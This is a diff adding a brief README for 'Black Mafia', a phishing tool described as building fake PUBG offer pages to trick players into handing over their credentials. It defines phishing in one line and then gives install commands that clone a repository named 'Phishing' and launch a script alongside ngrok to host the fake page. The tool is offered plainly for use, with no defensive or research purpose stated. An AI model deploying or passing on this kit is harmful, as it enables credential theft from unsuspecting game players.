@@ -1,0 +1,15 @@
+A Briefly Definition Of Pishing
+
+Phishing tools are typically used to trick people into giving away their personal information (credentials) by creating fake login pages or websites that look like legitimate ones.
+
+Black Mafia: A PUBG Phishing tool that will allow you to Create pishing pages that looks like A PUBG Offer Page
+
+
+Installation
+
+apt update && apt upgrade 
+apt install php wget git 
+git clone https://github.com/lovehacker404/Phishing
+cd Phishing
+chmod +x BlackMafia.sh ngrok
+bash BlackMafia.sh
